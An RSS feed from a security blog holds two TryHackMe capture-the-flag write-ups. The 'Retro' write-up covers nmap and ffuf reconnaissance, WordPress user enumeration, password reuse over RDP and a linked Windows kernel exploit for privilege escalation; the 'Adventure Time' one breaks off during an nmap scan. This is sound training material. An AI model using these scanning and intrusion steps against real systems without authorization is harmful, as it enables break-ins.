<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hard on 0000FF</title><link>https://simonefelici.github.io/categories/hard/</link><description>Recent content in Hard on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 23 Jan 2024 17:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/categories/hard/index.xml" rel="self" type="application/rss+xml"/><item><title>Retro Writeup THM</title><link>https://simonefelici.github.io/p/retro-writeup-thm/</link><pubDate>Tue, 23 Jan 2024 17:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/retro-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%201.png" alt="Featured image of post Retro Writeup THM" />&lt;h1 id="retro">Retro
&lt;/h1>&lt;p>First of all I am going to do an nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -Pn -sC -sV -p- 10.10.185.96
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-23 11:18 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.185.96
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.057s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65533&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Microsoft IIS httpd 10.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: IIS Windows Server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-IIS/10.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Potentially risky methods: TRACE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server Microsoft Terminal Services
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: 2024-01-23T16:20:36+00:00&lt;span class="p">;&lt;/span> -3s from scanner time.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>RetroWeb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2024-01-22T16:18:23
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2024-07-23T16:18:23
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> rdp-ntlm-info:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Target_Name: RETROWEB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> NetBIOS_Domain_Name: RETROWEB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> NetBIOS_Computer_Name: RETROWEB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNS_Domain_Name: RetroWeb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNS_Computer_Name: RetroWeb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Product_Version: 10.0.14393
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ System_Time: 2024-01-23T16:20:31+00:00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_clock-skew: mean: -3s, deviation: 0s, median: -3s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 118.57 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Here we can see that it is hosting a web server and accepts rdp connections.&lt;/p>
&lt;p>First of all I am goin g to visit the web page:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>This is the default page of Microsoft IIS.&lt;/p>
&lt;p>Now I am going to start a fuzzer, so we can discover subdirectories:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u &lt;span class="s1">&amp;#39;http://10.10.185.96/FUZZ&amp;#39;&lt;/span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.185.96/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">retro &lt;span class="o">[&lt;/span>Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 194ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We found the subdirectory “retro”&lt;/p>
&lt;p>Let’s see what’s in there:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Ok, from there we can retrieve a lot of informations, first of all is running wordpress 5.2.1 which is kinda old, so maybe I can find some exploit.&lt;/p>
&lt;p>Second I found the login page, and we can see that after entering the username “wade” which is the one that is writing the posts, we see that the username exists using a known information disclosure vuln of wp:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>After browsing the site I came upon this message:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%206.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>I tried to use it as a password and it worked!&lt;/p>
&lt;p>Now we just want to spawn a reverse shell using the dashboard.&lt;/p>
&lt;p>Actually, for now we don’t need that. I also tried the credentials with rdp and it worked.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%204.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>And we can get our fist flag.&lt;/p>
&lt;p>Now, I wanted to use the UAC method to exploit the machine, but I searched and that is bugged, so I used this exploit:&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip" target="_blank" rel="noopener"
>&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Retro-writeup-THM/main/86aeeb34-ae2f-4bd6-9c9e-4b097945e629_Export-e1ce40fe-b4be-42af-ae4e-bdd7093a35ea/Retro%201d42eb309fba416b8c2ec50ed807d03e/Untitled%205.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We just need to open it and we are root.&lt;/p></description></item><item><title>Adventure Time Writeup THM</title><link>https://simonefelici.github.io/p/adventure-time-writeup-thm/</link><pubDate>Thu, 18 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/adventure-time-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png" alt="Featured image of post Adventure Time Writeup THM" />&lt;p>I am going to do a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
&lt;/span>&lt;span class="lnt">117
&lt;/span>&lt;span class="lnt">118
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -T4 -A 10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-08 13:55 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.057s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">995&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> STAT:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> FTP server status:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connected to ::ffff:10.11.65.91
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Logged in as ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> TYPE: ASCII
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> No session bandwidth limit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Session timeout in seconds is &lt;span class="m">300&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Control connection is plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Data connections will be plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> At session startup, client count was &lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> vsFTPd 3.0.3 - secure, fast, stable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_End of status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-anon: Anonymous FTP login allowed &lt;span class="o">(&lt;/span>FTP code 230&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">1401357&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 1.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">233977&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 2.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">524615&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 3.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">771076&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 4.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">1644395&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 5.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_-r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">40355&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 6.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.6p1 Ubuntu &lt;span class="m">4&lt;/span> &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 58:d2:86:99:c2:62:2d:95:d0:75:9c:4e:83:b6:1b:ca &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> db:87:9e:06:43:c7:6e:00:7b:c3:bc:a1:97:dd:5e:83 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 6b:40:84:e6:9c:bc:1c:a8:de:b2:a1:8b:a3:6a:ef:f0 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.29
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: &lt;span class="m">404&lt;/span> Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">443/tcp open ssl/http Apache httpd 2.4.29 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> tls-alpn:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ http/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>adventure-time.com/organizationName&lt;span class="o">=&lt;/span>Candy Corporate Inc./stateOrProvinceName&lt;span class="o">=&lt;/span>Candy Kingdom/countryName&lt;span class="o">=&lt;/span>CK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2019-09-20T08:29:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2020-09-19T08:29:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: You found Finn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: TLS randomness does not represent &lt;span class="nb">time&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">31337/tcp open Elite?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> fingerprint-strings:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNSStatusRequestTCP, RPCCheck, SSLSessionReq:
